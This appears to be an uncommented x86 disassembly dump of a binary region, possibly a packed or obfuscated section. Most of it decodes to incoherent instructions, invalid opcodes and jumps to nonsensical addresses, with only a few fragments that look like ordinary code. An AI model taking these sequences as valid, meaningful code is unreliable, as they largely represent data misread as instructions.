  41309a:	test   DWORD PTR [edx-0x47],ebp
  41309d:	and    BYTE PTR [eax-0x62c549e9],ch
  4130a3:	repz cwde 
  4130a5:	cmp    DWORD PTR [ecx],ebp
  4130a7:	adc    eax,0x9b522d71
  4130ac:	stc    
  4130ad:	inc    ecx
  4130ae:	idiv   BYTE PTR [eax+0x33]
  4130b1:	and    edx,DWORD PTR [ebp-0x41]
  4130b4:	aam    0x6b
  4130b6:	stos   DWORD PTR es:[edi],eax
  4130b7:	sbb    BYTE PTR [eax-0x42],bl
  4130ba:	verw   WORD PTR [ebx+0x35]
  4130be:	loopne 0x41308d
  4130c0:	jge    0x413079
  4130c2:	mov    ch,0x73
  4130c4:	and    ah,bl
  4130c6:	(bad)  
  4130c7:	rol    esp,1
  4130c9:	(bad)  
  4130ca:	jmp    0x81385263
  4130cf:	or     eax,edi
  4130d1:	mov    esp,0x6915f952
  4130d6:	btc    DWORD PTR [eax+0x76],esi
  4130da:	rcl    DWORD PTR [esi],1
  4130dc:	lea    ebp,[ebx]
  4130de:	push   0x2b
  4130e0:	test   al,0x19
  4130e2:	pushf  
  4130e3:	xchg   ebx,eax
  4130e4:	xchg   ebp,eax
  4130e5:	fcomip st,st(4)
  4130e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130e8:	inc    ebx
  4130e9:	ret    
  4130ea:	loop   0x413143
  4130ec:	aad    0x19
  4130ee:	fnsave [ebp-0x19]
  4130f1:	mov    esp,DWORD PTR [ebx]
  4130f3:	inc    eax
  4130f4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130f6:	daa    
  4130f7:	and    edi,ebx
  4130f9:	jmp    0x366819cd
  4130fe:	test   al,0xf3
  413100:	inc    edi
  413101:	dec    edx
  413102:	aam    0x4d
  413104:	jl     0x413121
  413106:	inc    esi
  413107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413108:	xor    BYTE PTR [eax],0x78
  41310b:	xchg   edx,eax
  41310c:	adc    al,0xf6
  41310e:	aaa    
  41310f:	or     edi,DWORD PTR [ebx+0x50]
  413112:	cmp    al,0xee
  413114:	sub    BYTE PTR [ebx-0x37],0x31
  413118:	pusha  
  413119:	mov    esi,0x169418fd
  41311e:	inc    ebp
  41311f:	add    al,0xe7
  413121:	pusha  
  413122:	xlat   BYTE PTR ss:[ebx]
  413124:	push   es
  413125:	xchg   edx,eax
  413126:	pop    edi
  413127:	(bad)  
  413128:	aaa    
  413129:	add    BYTE PTR [ecx+0x7bbb1b2d],dh
  41312f:	push   ecx
  413130:	cmp    DWORD PTR [ecx],ebp
  413132:	jmp    0xfd5b:0xfaf6
  413138:	loope  0x41316e
  41313a:	and    eax,DWORD PTR [eax+esi*4]
  41313d:	hlt    
  41313e:	aad    0xab
  413140:	nop
  413141:	lea    edi,[edx-0x64]
  413144:	add    ebx,esp
  413146:	addr16 inc ebx
  413148:	mov    DWORD PTR [ebp-0x28],esi
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41317f:	xor    eax,0x61a36ae2
  413184:	jo     0x4131f6
  413186:	mov    ecx,0x1c70707e
  41318b:	loopne 0x413111
  41318d:	(bad)  
  41318e:	pop    edx
  41318f:	push   ecx
  413190:	in     al,0x18
  413192:	cmp    esp,esi
  413194:	jg     0x4131d8
  413196:	sub    eax,edx
  413198:	sub    DWORD PTR [ecx-0x7a],edi
  41319b:	daa    
  41319c:	daa    
  41319d:	ins    DWORD PTR es:[edi],dx
  41319e:	add    dh,al
  4131a0:	jecxz  0x413159
  4131a2:	xor    BYTE PTR [edx+0x2f],0xa1
  4131a6:	fst    QWORD PTR [edi+ebx*2]
  4131a9:	sub    dl,BYTE PTR [eax+eax*2-0x60621b59]
  4131b0:	pop    eax
  4131b1:	out    0x2c,al
  4131b3:	loop   0x4131ce
  4131b5:	mov    ebp,0xe1652c89
  4131ba:	repz in al,dx
  4131bc:	mov    ebp,0x22039d9f
  4131c1:	mov    bl,bh
  4131c3:	out    dx,al
  4131c4:	dec    eax
  4131c5:	repz jns 0x41316f
  4131c8:	test   al,0x6c
  4131ca:	mov    ecx,0x26c8ebd6
  4131cf:	or     ebp,DWORD PTR [ebx-0x64]
  4131d2:	pop    ecx
  4131d3:	jno    0x4131fe
  4131d5:	jmp    0xd3a6:0x8555afa0
  4131dc:	into   
  4131dd:	mov    ecx,0x2d110ef6
  4131e2:	dec    esp
  4131e3:	push   edx
  4131e4:	cs loopne 0x41325b
  4131e7:	sbb    ebp,DWORD PTR [esi-0x5a]
  4131ea:	xchg   BYTE PTR [edi],cl
  4131ec:	retf   
  4131ed:	sti    
  4131ee:	xor    eax,edi
  4131f0:	and    DWORD PTR [esi],0xfc345fa3
  4131f6:	xor    eax,0xc234b697
  4131fb:	jnp    0x4131b9
  4131fd:	dec    ecx
  4131fe:	or     ebp,edx
  413200:	ret    0xcae3
  413203:	jmp    0xc0bc:0xee733d45
  41320a:	jg     0x4131ef
  41320c:	leave  
  41320d:	push   ss
  41320e:	(bad)  
  41320f:	aad    0x1b
  413211:	adc    DWORD PTR [ebx+0x20],edx
  413214:	add    bh,BYTE PTR [edx+ecx*1]
  413217:	push   ebp
  413218:	dec    ebx
  413219:	test   BYTE PTR [edi],bl
  41321b:	push   ebp
  41321c:	xchg   edi,eax
  41321d:	(bad)  
  41321f:	lds    edi,FWORD PTR [esp+esi*1+0x71553e1a]
  413226:	pop    ss
  413227:	fs popa 
  413229:	inc    ebx
  41322a:	popa   
  41322b:	enter  0x43dc,0xa7
  41322f:	mov    BYTE PTR [ebx+ebp*1+0x5471a5b1],al
  413236:	nop
  413237:	inc    ecx
  413238:	adc    bh,al
  41323a:	outs   dx,DWORD PTR ds:[esi]
  41323b:	clc    
  41323c:	cmp    al,0xb6
  41323e:	and    edi,edi
  413240:	mov    bh,0x2d
  413242:	jecxz  0x41328a
  413244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413245:	addr16 xor ebx,0x4e
  413249:	mov    bl,0xd5
  41324b:	(bad)  
  41324c:	xlat   BYTE PTR ds:[ebx]
  41324d:	test   DWORD PTR [esi+0x7017411d],ecx
  413253:	jge    0x4132d0
  413255:	add    al,0x8
  413257:	and    BYTE PTR ds:[ecx],ch
  41325a:	call   FWORD PTR [edx]
  41325c:	scas   al,BYTE PTR es:[edi]
  41325d:	add    edx,ebx
  41325f:	sahf   
  413260:	inc    edi
  413261:	stc    
  413262:	mov    esi,0xc10bb61
  413267:	stos   DWORD PTR es:[edi],eax
  413268:	pop    edi
  413269:	add    eax,0xb4b56608
  41326e:	shl    BYTE PTR [ebx+0x20d4291c],1
  413274:	imul   ebx,DWORD PTR [edx],0xffffff90
  413277:	mov    cl,0xa3
  413279:	mov    eax,0x64f2655a
  41327e:	lds    edx,FWORD PTR [ebx]
  413280:	ins    BYTE PTR es:[edi],dx
  413281:	fcmovbe st,st(7)
  413283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413284:	ins    DWORD PTR es:[edi],dx
  413285:	jae    0x413216
  413287:	add    al,0x36
  413289:	mov    al,0x90
  41328b:	addr16 mov dl,0xe8
  41328e:	sub    bl,BYTE PTR [esi+0x35]
  413291:	jmp    0xad2f7689
  413296:	cmovno esp,DWORD PTR [esi]
  413299:	arpl   WORD PTR [ebx],dx
  41329b:	cwde   
  41329c:	mov    DWORD PTR [eax-0x21],ebp
  41329f:	scas   eax,DWORD PTR es:[edi]
  4132a0:	lds    eax,FWORD PTR ds:0x977284a7
  4132a6:	ficomp DWORD PTR [ecx]
  4132a8:	cdq    
  4132a9:	mov    al,0xce
  4132ab:	aaa    
  4132ac:	jmp    0x41332d
  4132ae:	test   eax,0x429a015b
  4132b3:	pop    ecx
  4132b4:	mov    eax,0x6ba66203
  4132b9:	dec    ecx
  4132ba:	inc    eax
  4132bb:	sbb    al,0xc9
  4132bd:	inc    edx
  4132be:	jno    0x4132de
  4132c0:	into   
  4132c1:	mov    ebp,0xdc4237f6
  4132c6:	pusha  
  4132c7:	outs   dx,BYTE PTR ds:[esi]
  4132c8:	or     esp,DWORD PTR es:[ebx]
  4132cb:	or     al,0x11
  4132cd:	(bad)  
  4132ce:	enter  0xcb76,0x22
  4132d2:	push   0xd2fb2c7d
  4132d7:	pop    eax
  4132d8:	sbb    ecx,DWORD PTR [eax]
  4132da:	lea    eax,[ebx]
  4132dc:	scas   eax,DWORD PTR es:[edi]
  4132dd:	dec    edx
  4132de:	xlat   BYTE PTR ds:[ebx]
  4132df:	mov    ebx,0xeda88d6a
  4132e4:	xchg   edi,eax
  4132e6:	mov    ebx,DWORD PTR [eax-0x27f68fdf]
  4132ec:	push   ds
  4132ed:	(bad)  
  4132ee:	mov    eax,0x289e1e28
  4132f3:	push   ds
  4132f4:	push   0x86a7cefc
  4132f9:	inc    edi
  4132fa:	loope  0x4132d8
  4132fc:	fistp  QWORD PTR ds:0xe0834f7d
  413302:	dec    esi
  413303:	inc    edx
  413304:	adc    DWORD PTR [esi-0x1c],esi
  413307:	and    ecx,DWORD PTR [ebp+0x5c]
  41330a:	inc    esp
  41330b:	jge    0x41329b
  41330d:	call   0xa9f1:0xa807024f
  413314:	mov    ds:0xcff3b53b,eax
  413319:	xchg   ebx,eax
  41331a:	or     BYTE PTR [ebp+0x25772e60],ch
  413320:	push   edx
  413321:	nop
  413322:	sbb    dl,BYTE PTR [eax-0x61]
  413325:	cwde   
  413326:	push   0x239db237
  41332b:	cmp    eax,0x88bc40ab
  413330:	or     DWORD PTR [eax+0x4e69b325],0xdaa6fea0
  41333a:	push   ss
  41333b:	(bad)  
  41333c:	push   ebx
  41333d:	cmp    eax,0x4dd7dad6
  413342:	add    DWORD PTR [esi],0xf54fe75a
  413348:	je     0x4133a7
  41334a:	dec    ebp
  41334b:	js     0x4133c3
  41334d:	out    dx,eax
  41334e:	dec    esi
  41334f:	mov    al,0xaa
  413351:	push   ds
  413352:	mov    bl,0xa3
  413354:	and    al,0xff
  413356:	fs xor al,0x3a
  413359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41335a:	pop    eax
  41335b:	arpl   WORD PTR [edx+ecx*1-0x48],cx
  41335f:	or     DWORD PTR [edx-0xf],0x33
  413363:	push   ebx
  413364:	pmullw mm6,QWORD PTR [eax+0x7f9fae0f]
  41336b:	adc    ah,0xc9
  41336e:	jbe    0x4133d2
  413370:	adc    eax,0xfcae44d6
  413375:	or     ecx,edx
  413377:	or     DWORD PTR [edx+ecx*8+0x76],ecx
  41337b:	pop    ebx
  41337c:	sub    dl,BYTE PTR [ecx]
  41337e:	xchg   esi,eax
  41337f:	cs mov edi,0x8100a5d6
  413385:	xchg   edi,eax
  413386:	xchg   ebx,eax
  413387:	not    ecx
  413389:	and    edi,DWORD PTR [ebp-0x47]
  41338c:	sub    bh,BYTE PTR [esi]
  41338e:	(bad)  
  41338f:	xchg   edx,eax
  413390:	push   ecx
  413391:	nop
  413392:	jmp    0x8871b9d4
  413397:	mov    dh,0xb7
  413399:	mov    eax,ds:0x9c9e91fe
  41339e:	ja     0x41336d
  4133a0:	bound  edx,QWORD PTR [eax-0x22c66f2b]
  4133a6:	jl     0x4133f5
  4133a8:	mov    ecx,0xf7a138a1
  4133ad:	or     eax,0x89b0cf48
  4133b2:	ret    
  4133b3:	sahf   
  4133b4:	test   DWORD PTR [edx+ecx*8-0x7e],ebp
  4133b8:	mov    edi,0xed9d2c9c
  4133bd:	data16 jp 0x413392
  4133c0:	lea    esp,[ecx+0xe]
  4133c3:	cli    
  4133c4:	das    
  4133c5:	icebp  
  4133c6:	int    0x3e
  4133c8:	iret   
  4133c9:	and    edi,DWORD PTR [esi]
  4133cb:	xchg   DWORD PTR [edx+0x6aa002c5],esi
  4133d1:	adc    eax,ecx
  4133d3:	test   DWORD PTR [edx],esi
  4133d5:	loopne 0x41343b
  4133d7:	sub    DWORD PTR [ebp-0x2149632d],ecx
  4133dd:	lds    ecx,FWORD PTR [edi]
  4133df:	and    ch,BYTE PTR [esi]
  4133e1:	add    cl,BYTE PTR [edi+0x2b]
  4133e4:	jle    0x41343d
  4133e6:	sub    dh,cl
  4133e8:	xchg   edx,eax
  4133e9:	cld    
  4133ea:	test   al,0xb2
  4133ec:	cmp    eax,0x5ea0f177
  4133f1:	iret   
  4133f2:	jne    0x413392
  4133f4:	(bad)  [ebx+edi*4+0x68b89c9f]
  4133fb:	aad    0x87
  4133fd:	sub    BYTE PTR [ebp-0x2ff1b5f7],bl
  413403:	xor    BYTE PTR [edx+0x532391e3],bl
  413409:	fs inc esp
  41340b:	cmp    esi,DWORD PTR [esi-0x4fd0dfd4]
  413411:	sub    esi,edx
  413413:	fsubp  st(4),st
  413415:	mov    ah,0x42
  413417:	out    dx,eax
  413418:	test   eax,0x7e23429b
  41341d:	rol    BYTE PTR [edi],cl
  41341f:	xchg   BYTE PTR [ebx-0x9],dl
  413422:	or     esp,DWORD PTR [eax-0x58]
  413425:	ss xor ecx,eax
  413428:	dec    ecx
  413429:	jle    0x413472
  41342b:	mov    dl,0x3b
  41342d:	mov    eax,0x668ae322
  413432:	mov    edi,0x5ef68fe
  413437:	cmp    al,0xc2
  413439:	rcl    BYTE PTR [ebx+0x251913c7],cl
  41343f:	in     eax,0xa0
  413441:	ss int 0x95
  413444:	and    ecx,DWORD PTR [eax]
  413446:	xor    ebp,ebp
  413448:	mov    al,ds:0xf9199531
  41344d:	mov    ebp,DWORD PTR [eax-0x34fc6c61]
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0xfedb1e0f,al
  413492:	shr    esp,cl
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x3d70707e
  41349c:	test   BYTE PTR [eax-0x79c9b2e],ch
  4134a2:	mov    ebp,0x64d932da
  4134a7:	retf   0xe66
  4134aa:	xor    edx,0x5e1cf0d1
  4134b0:	push   esi
  4134b1:	std    
  4134b2:	or     edi,DWORD PTR [esi+0x3]
  4134b5:	pop    ebx
  4134b6:	push   ecx
  4134b7:	add    BYTE PTR [ecx-0x23],0xe1
  4134bb:	or     ch,BYTE PTR [esi]
  4134bd:	jmp    0xd20e:0xe61de5a3
  4134c4:	adc    edi,esp
  4134c6:	push   esi
  4134c7:	adc    cl,ah
  4134c9:	outs   dx,BYTE PTR ds:[esi]
  4134ca:	(bad)  
  4134cb:	mov    edi,DWORD PTR [esi]
  4134cd:	nop
  4134ce:	cmp    eax,0x9a1b0697
  4134d3:	das    
  4134d4:	mov    cl,BYTE PTR ds:[ebp-0x22]
  4134d8:	cdq    
  4134d9:	std    
  4134da:	xchg   esi,eax
  4134db:	loopne 0x413540
  4134dd:	jae    0x413474
  4134df:	dec    eax
  4134e0:	jmp    0x6a78:0x5e15ec4b
  4134e7:	rol    DWORD PTR [ecx-0x5e],0xdd
  4134eb:	inc    ebx
  4134ec:	pop    ebp
  4134ed:	aam    0x44
  4134ef:	data16 mov bl,0x5b
  4134f2:	push   eax
  4134f3:	mov    al,0xe5
  4134f5:	cmp    esi,DWORD PTR [edi-0x24]
  4134f8:	int3   
  4134f9:	add    ecx,DWORD PTR [esi-0x26dd662e]
  4134ff:	inc    edx
  413500:	adc    al,0x1f
  413502:	scas   al,BYTE PTR es:[edi]
  413503:	push   cs
  413504:	lods   eax,DWORD PTR ds:[esi]
  413505:	cmp    ebp,eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	xchg   esp,eax
  413509:	push   ds
  41350a:	scas   al,BYTE PTR es:[edi]
  41350b:	push   edi
  41350c:	pop    ds
  41350d:	add    bl,BYTE PTR [eax+0x2f45bdc2]
  413513:	mov    eax,0xf3e7a424
  413518:	jg     0x413508
  41351a:	xchg   ecx,eax
  41351b:	push   ecx
  41351c:	inc    esi
  41351d:	daa    
  41351e:	cdq    
  41351f:	sub    eax,0x9fe81b0d
  413524:	pusha  
  413525:	push   0x2570c6cb
  41352a:	push   0x5f
  41352c:	test   eax,0x2c9693fb
  413531:	pop    ebp
  413532:	sahf   
  413533:	sub    eax,0x6c44b67f
  413538:	add    edi,DWORD PTR [ebx]
  41353a:	std    
  41353b:	mov    esi,0x20a5e1bd
  413540:	popa   
  413541:	jae    0x4135be
  413543:	mov    eax,cs:0xe52cdd30
  413549:	add    al,0x42
  41354b:	scas   al,BYTE PTR es:[edi]
  41354c:	sub    al,BYTE PTR [eax]
  41354e:	inc    esi
  41354f:	xor    ch,al
  413551:	std    
  413552:	test   DWORD PTR [ecx-0x79],esi
  413555:	aaa    
  413556:	test   al,0x65
  413558:	shl    DWORD PTR [ebx+esi*2-0x6121e689],cl
  41355f:	mov    ebx,0xe36dcd8d
  413564:	inc    edi
  413565:	js     0x41358a
  413567:	push   0xfffffff9
  413569:	addr16 and eax,0x7fdb1b83
  41356f:	or     BYTE PTR ds:0xe0df43ed,ch
  413575:	mov    bl,0x87
  413577:	js     0x4135cd
  413579:	fnstsw WORD PTR [ebp-0x6e]
  41357c:	out    dx,eax
  41357d:	clc    
  41357e:	mov    ch,0x10
  413580:	je     0x41358b
  413582:	and    eax,0xe6425b18
  413587:	mov    al,ds:0x7f47b759
  41358c:	out    dx,eax
  41358d:	sub    edx,edx
  41358f:	and    DWORD PTR [ebp+0xab37b99],ebp
  413595:	pop    es
  413596:	dec    ebx
  413597:	mov    ecx,0x7b6ea53d
  41359c:	out    dx,al
  41359d:	push   eax
  41359e:	nop
  41359f:	push   ecx
  4135a0:	mov    ah,BYTE PTR [ebx+ebp*8-0x71f4834c]
  4135a7:	sbb    ch,BYTE PTR [ecx+0x1f]
  4135aa:	shr    DWORD PTR [esi],cl
  4135ac:	rcr    BYTE PTR [eax+0x3a1b594e],1
  4135b2:	les    ebx,FWORD PTR [eax+esi*4]
  4135b5:	jp     0x413540
  4135b7:	xor    esp,edx
  4135b9:	or     eax,0xaffc01d7
  4135be:	js     0x41362c
  4135c0:	and    al,0x59
  4135c2:	dec    ecx
  4135c3:	push   ebp
  4135c4:	in     al,dx
  4135c5:	out    0xd3,eax
  4135c7:	sbb    edi,DWORD PTR [edx]
  4135c9:	jecxz  0x413611
  4135cb:	jae    0x4135db
  4135cd:	add    al,0x33
  4135cf:	cmp    edx,DWORD PTR [esi+0x71e9c4aa]
  4135d5:	dec    edi
  4135d6:	mov    bh,BYTE PTR [edx]
  4135d8:	mov    ebx,DWORD PTR gs:[ecx-0x7c]
  4135dc:	sbb    cl,ch
  4135de:	mov    gs,WORD PTR [ebx]
  4135e0:	jb     0x413633
  4135e2:	ins    BYTE PTR es:[edi],dx
  4135e3:	xor    DWORD PTR [eax-0x5beb1c7f],ebp
  4135e9:	or     eax,edi
  4135eb:	sahf   
  4135ec:	jnp    0x413572
  4135ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135ef:	sbb    DWORD PTR [ebx+0x7be6c0f5],ebp
  4135f5:	gs pop edi
  4135f7:	jnp    0x413617
  4135f9:	shl    BYTE PTR [esi-0x2],cl
  4135fc:	pop    es
  4135fd:	je     0x4135e0
  4135ff:	and    al,0x32
  413601:	sbb    ebx,DWORD PTR [esi+0x1d]
  413604:	addr16 jae 0x4135d1
  413607:	and    esi,DWORD PTR [edx+0x29b3da5b]
  41360d:	das    
  41360e:	test   DWORD PTR [eax+0x5f],ebx
  413611:	outs   dx,BYTE PTR ds:[esi]
  413612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413613:	cmc    
  413614:	cmc    
  413615:	or     al,0xbe
  413617:	adc    al,0xba
  413619:	repnz leave 
  41361b:	test   esp,0x9ff90089
  413621:	aad    0x42
  413623:	jo     0x4135e4
  413625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413626:	add    bh,BYTE PTR [ebx+0x7a]
  413629:	and    edi,DWORD PTR [edi]
  41362b:	rol    BYTE PTR [ebp+0x3a],1
  41362e:	leave  
  41362f:	loop   0x413668
  413631:	js     0x4135f5
  413633:	pop    esp
  413634:	out    dx,al
  413635:	stos   BYTE PTR es:[edi],al
  413636:	jecxz  0x413612
  413638:	cmp    cl,BYTE PTR [edi+0x49]
  41363b:	inc    edx
  41363c:	xchg   esi,eax
  41363e:	sahf   
  41363f:	cmc    
  413640:	sub    bl,BYTE PTR [esi]
  413642:	jle    0x4135fd
  413644:	fldl2t 
  413646:	sub    DWORD PTR [eax],esi
  413648:	mov    bl,0x2d
  41364a:	or     BYTE PTR [esi+0x341dd781],bl
  413650:	(bad)  
  413651:	fwait
  413652:	or     DWORD PTR [ebx+0xc33840e],ebx
  413658:	aas    
  413659:	jg     0x41368e
  41365b:	inc    edx
  41365c:	cmc    
  41365d:	add    bl,cl
  41365f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413660:	dec    edi
  413661:	pushf  
  413662:	out    dx,eax
  413663:	cld    
  413664:	adc    bh,BYTE PTR [ebp+0x76]
  413667:	push   cs
  413668:	sbb    esp,ecx
  41366a:	(bad)  
  41366b:	adc    eax,0x1ed77c31
  413670:	mov    bh,0x88
  413672:	mov    edx,0x2b2dbcb
  413677:	inc    esi
  413678:	push   edx
  413679:	inc    edi
  41367a:	sub    al,0xb2
  41367c:	dec    bl
  41367e:	cmp    ecx,DWORD PTR [ebx]
  413680:	(bad)  
  413681:	out    dx,al
  413682:	retf   
  413683:	xor    dl,dh
  413685:	repz push edi
  413687:	xchg   esp,eax
  413688:	or     eax,0xd30894c2
  41368d:	mul    DWORD PTR [edx+0x349e6565]
  413693:	out    0xa4,al
  413695:	and    BYTE PTR [edx-0x201829a3],dh
  41369b:	jmp    0x413719
  41369d:	pop    esp
  41369e:	inc    esp
  41369f:	in     al,0x72
  4136a1:	fs push esp
  4136a3:	pop    edx
  4136a4:	sbb    dl,bl
  4136a6:	mov    DWORD PTR [ebp+0x33],esp
  4136a9:	cdq    
  4136aa:	cmp    bl,0x45
  4136ad:	aas    
  4136ae:	std    
  4136af:	adc    BYTE PTR [edx-0x566c111e],cl
  4136b5:	shl    dh,0xcb
  4136b8:	sub    al,0xe4
  4136ba:	fisttp WORD PTR [ecx-0x3016d564]
  4136c0:	mov    eax,ds:0x19dc2e86
  4136c5:	mov    al,ds:0xc295b012
  4136ca:	mov    ecx,0x37438a9c
  4136cf:	rol    ebp,0xaa
  4136d2:	cmp    edx,DWORD PTR [edx]
  4136d4:	mov    dh,0x3f
  4136d6:	ror    DWORD PTR [eax-0x417b3e79],0x8
  4136dd:	adc    al,ch
  4136df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e0:	call   0xabbd4c31
  4136e5:	adc    al,0x35
  4136e7:	pushf  
  4136e8:	fdivr  st(5),st
  4136ea:	mov    dl,0x2c
  4136ec:	psubd  mm2,mm4
  4136ef:	push   esp
  4136f0:	xor    BYTE PTR [eax+0x177d1405],0x66
  4136f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136f8:	and    esi,DWORD PTR [esi]
  4136fa:	push   ds
  4136fb:	sub    BYTE PTR [ecx+0x14],bh
  4136fe:	loopne 0x4136fb
  413700:	sub    ecx,DWORD PTR [ebx-0x18]
  413703:	xchg   edi,eax
  413704:	dec    ebx
  413705:	mov    ds:0xf8858a52,al
  41370a:	sub    eax,0x46ad1adf
  41370f:	dec    ecx
  413710:	in     al,dx
  413711:	mov    dl,0x59
  413713:	pop    edi
  413714:	pusha  
  413715:	jno    0x413787
  413717:	dec    eax
  413718:	popf   
  413719:	lahf   
  41371a:	fild   QWORD PTR [ebx]
  41371c:	fnstenv [eax+edi*1]
  41371f:	adc    eax,DWORD PTR [ebx+0x6816f899]
  413725:	lods   eax,DWORD PTR ds:[esi]
  413726:	jle    0x4136f1
  413728:	cmp    al,0x4b
  41372a:	ret    0x8ba0
  41372d:	cmp    bh,BYTE PTR [edi+0x43618b27]
  413733:	icebp  
  413734:	adc    bl,0xa1
  413737:	out    0x4a,eax
  413739:	imul   eax,DWORD PTR [ebp+0x1f91ef1],0xf3e89220
  413743:	sahf   
  413744:	loop   0x4137c5
  413746:	push   es
  413747:	test   al,0x99
  413749:	mov    ds:0xdafb8488,eax
  41374e:	shl    DWORD PTR [eax+0x70],1
  413751:	or     edx,DWORD PTR [ebp+0x21]
  413754:	mov    eax,0xb0c2748a
  413759:	sbb    edi,ebx
  41375b:	rcr    DWORD PTR [eax-0x4e],1
  41375e:	push   edi
  41375f:	pop    es
  413760:	inc    esi
  413761:	lea    edi,[ebx]
  413763:	clc    
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	xor    al,cl
  413780:	test   al,0xd8
  413782:	xor    eax,0xb970706b
  413787:	jle    0x4137f9
  413789:	jo     0x41371a
  41378b:	pop    es
  41378c:	jmp    DWORD PTR [ebx+0x38daa6a1]
  413792:	ins    DWORD PTR es:[edi],dx
  413793:	(bad)  
  413794:	cmp    ah,BYTE PTR [edi+0x3c7991fd]
  41379a:	add    al,0xe3
  41379c:	pop    ebx
  41379d:	jo     0x413741
  41379f:	ins    DWORD PTR es:[edi],dx
  4137a0:	rcr    BYTE PTR [ecx-0x544d67c1],cl
  4137a6:	jbe    0x413826
  4137a8:	push   ebp
  4137a9:	adc    eax,0xaa227730
  4137ae:	jecxz  0x41382f
  4137b0:	add    BYTE PTR es:[ecx-0x4a80140f],al
  4137b7:	add    DWORD PTR [ebx-0x5e],ebx
  4137ba:	sbb    DWORD PTR [edi],0x1fa62091
  4137c0:	ds and eax,0xcb9375f3
  4137c6:	mov    ds:0xd7011c6,eax
  4137cb:	xchg   ebx,eax
  4137cc:	mov    edx,0xe8d96fdf
  4137d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137d2:	mov    bh,0xaf
  4137d4:	mov    ds:0x84e29041,al
  4137d9:	dec    esp
  4137da:	mov    esp,0x3486a61
  4137df:	adc    ecx,DWORD PTR [ecx]
  4137e1:	inc    esi
  4137e2:	jno    0x41384d
  4137e4:	lds    edx,FWORD PTR gs:[edx+edi*1+0x30]
  4137e9:	push   esp
  4137ea:	aad    0x98
  4137ec:	stc    
  4137ed:	nop
  4137ee:	arpl   WORD PTR [edx+0x49],dx
  4137f1:	daa    
  4137f2:	dec    BYTE PTR [edi-0x78c84967]
  4137f8:	mov    ch,0xde
  4137fa:	das    
  4137fb:	push   edi
  4137fc:	or     eax,0xf7355e44
  413801:	ins    DWORD PTR es:[edi],dx
  413802:	in     al,dx
  413803:	push   ss
  413804:	test   BYTE PTR [esi+eax*1],0x7a
  413808:	sbb    edx,DWORD PTR [ebp+0x21070972]
  41380e:	mov    bh,0x42
  413810:	cwde   
  413811:	sub    DWORD PTR [esi-0x23],esi
  413814:	pop    ebx
  413815:	adc    DWORD PTR [edx+0x3e349aa6],0xffffffe7
  41381c:	call   0x1dd599a3
  413821:	sub    eax,edi
  413823:	ja     0x413836
  413825:	cld    
  413826:	rol    edx,cl
  413828:	pop    esp
  413829:	and    esp,DWORD PTR [ebx]
  41382b:	mov    edi,0x7975b68e
  413830:	sub    BYTE PTR [edi+0x61],0x5
  413834:	jae    0x413893
  413836:	dec    edx
  413837:	mov    al,0xb
  413839:	loop   0x413874
  41383b:	cwde   
  41383c:	and    eax,0x697a4fc9
  413841:	in     eax,dx
  413842:	or     esi,ebp
  413844:	dec    ebp
  413845:	jecxz  0x413874
  413847:	pop    es
  413848:	and    ebx,DWORD PTR [esi-0x42d0b247]
  41384e:	pop    esp
  41384f:	(bad)
  413852:	mov    cl,0xd1
  413854:	mov    DWORD PTR [esi-0x38feb220],eax
  41385a:	dec    esp
  41385b:	inc    ecx
  41385c:	frstor [ebx+esi*8]
  41385f:	xchg   ebx,eax
  413860:	loope  0x413899
  413862:	jae    0x413880
  413864:	fimul  DWORD PTR [esi-0x78]
  413867:	push   cs
  413868:	jb     0x413874
  41386a:	push   eax
  41386b:	sbb    DWORD PTR es:[edx],0x70a27ad4
  413872:	xor    al,0xcb
  413874:	dec    eax
  413875:	xor    BYTE PTR [edx+0x22ab70d9],dh
  41387b:	mov    ah,0xb5
  41387d:	xchg   ebp,eax
  41387e:	loop   0x4138fd
  413880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413881:	repnz clc 
  413883:	or     DWORD PTR [ecx],edx
  413885:	mov    edi,0x65df1d22
  41388a:	dec    edx
  41388b:	sbb    DWORD PTR [ebx+0x3e],edi
